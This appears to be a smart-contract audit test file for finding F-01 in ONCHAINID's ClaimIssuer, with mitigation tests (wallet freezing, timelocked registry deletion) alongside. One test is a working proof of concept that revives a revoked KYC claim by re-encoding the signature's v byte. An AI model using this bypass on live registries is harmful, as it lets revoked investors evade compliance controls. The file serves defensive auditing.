// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.30;

import {Fixture} from "../helpers/Fixture.sol";
import {IIdentity} from "../../script/VendorInterfaces.sol";

/// @notice FINDING F-01 (ONCHAINID 2.2.1, ClaimIssuer): claim revocation can be bypassed.
///
/// ClaimIssuer stores revocations keyed by the raw signature bytes, while signature recovery
/// accepts several byte encodings of the same signature (v as 0/1 or 27/28, and the high-s twin).
/// A revoked investor can re-add their old claim with a re-encoded signature and become verified
/// again. These tests prove the issue and prove our mitigation.
///
/// Mitigation (contract-spec.md section 4.2): never rely on `revokeClaim*` alone. Offboarding means
/// (1) freeze the wallet via FreezeGuard immediately, (2) move or redeem the tokens, then (3) delete
/// the identity from the registry through the timelock.
contract OnchainIdRevocationBypassTest is Fixture {
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    function setUp() public override {
        super.setUp();
        _onboard(alice);
        _onboard(bob);
        _mint(alice, 100);
    }

    function _kycSignature() internal view returns (bytes memory data, bytes memory sig) {
        data = abi.encode("verified", TOPIC_KYC);
        sig = _claimSignature(identityOf[alice], TOPIC_KYC, data);
    }

    function test_F01_revocationWorksForTheExactSignature() public {
        (, bytes memory sig) = _kycSignature();
        vm.prank(claimIssuerManager);
        claimIssuer.revokeClaimBySignature(sig);
        assertFalse(ir.isVerified(alice), "revoked investor is unverified");
    }

    function test_F01_revokedClaimRevivedWithReencodedSignature() public {
        (bytes memory data, bytes memory sig) = _kycSignature();
        vm.prank(claimIssuerManager);
        claimIssuer.revokeClaimBySignature(sig);
        assertFalse(ir.isVerified(alice));

        // Same signature, v encoded as 0/1 instead of 27/28: different bytes, same signer.
        bytes memory reencoded = bytes.concat(sig);
        reencoded[64] = bytes1(uint8(reencoded[64]) - 27);

        vm.prank(alice);
        IIdentity(identityOf[alice]).addClaim(TOPIC_KYC, 1, address(claimIssuer), reencoded, data, "");

        assertTrue(ir.isVerified(alice), "FINDING: revoked investor is verified again");
    }

    function test_F01_mitigation_freezeStopsRevokedInvestor() public {
        (bytes memory data, bytes memory sig) = _kycSignature();
        vm.startPrank(claimIssuerManager);
        claimIssuer.revokeClaimBySignature(sig);
        vm.stopPrank();
        vm.prank(opsSafe);
        freezeGuard.freezeAddress(alice, bytes32("AML-CASE-9"));

        bytes memory reencoded = bytes.concat(sig);
        reencoded[64] = bytes1(uint8(reencoded[64]) - 27);
        vm.prank(alice);
        IIdentity(identityOf[alice]).addClaim(TOPIC_KYC, 1, address(claimIssuer), reencoded, data, "");

        vm.prank(alice);
        vm.expectRevert("wallet is frozen");
        token.transfer(bob, 1);
    }

    function test_F01_mitigation_registryDeletionThroughTimelock() public {
        vm.prank(opsSafe);
        freezeGuard.freezeAddress(alice, bytes32("AML-CASE-9"));
        // Redeem first: deleting an identity that still holds tokens strands them (F-02).
        vm.prank(issuanceSafe);
        issuance.burn(alice, 100, bytes32("aml-redemption"));
        _timelockExec(address(ir), abi.encodeWithSignature("deleteIdentity(address)", alice));
        assertFalse(ir.contains(alice));
        assertFalse(ir.isVerified(alice));
    }
}
